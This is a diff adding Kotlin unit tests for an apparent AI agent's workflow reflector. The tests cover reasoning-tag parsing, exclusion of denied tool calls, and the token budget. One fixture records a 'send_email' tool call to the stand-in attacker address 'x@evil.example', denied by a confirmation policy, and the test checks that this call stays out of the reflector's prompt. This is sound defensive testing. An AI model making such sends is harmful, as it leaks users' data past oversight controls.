@@ -45,4 +45,23 @@ class WorkflowReflectorTest : FunSpec({
         p shouldNotContain "x".repeat(1_000)
         p shouldContain "untrusted"
     }
+
+    test("an orphan </think> whose reasoning mentions {sender} still parses") {
+        val r = reflect("I'd use {sender} as a parameter\n</think>\n{\"reusable\": true, \"id\": \"a\", \"title\": \"A\", \"body\": \"1. x\"}")!!
+        r.reusable shouldBe true
+    }
+
+    test("failed or denied calls are left out of what the reflector sees") {
+        val withDenied = turn.copy(toolCalls = turn.toolCalls + ToolCallRecord("send_email", """{"to":"x@evil.example"}""",
+            "Error: Tool 'send_email' execution denied by confirmation policy", true))
+        val p = WorkflowReflector(ScriptedProvider(), "m").prompt(withDenied, emptyList())
+        p shouldNotContain "x@evil.example"
+        p shouldContain "browser_fill"
+    }
+
+    test("the token budget comes from the caller") {
+        val p = ScriptedProvider("""{"reusable": false}""")
+        runBlocking { WorkflowReflector(p, "m", maxTokens = 16_384).reflect(turn, emptyList()) }
+        p.requests.single().maxTokens shouldBe 16_384
+    }
 })
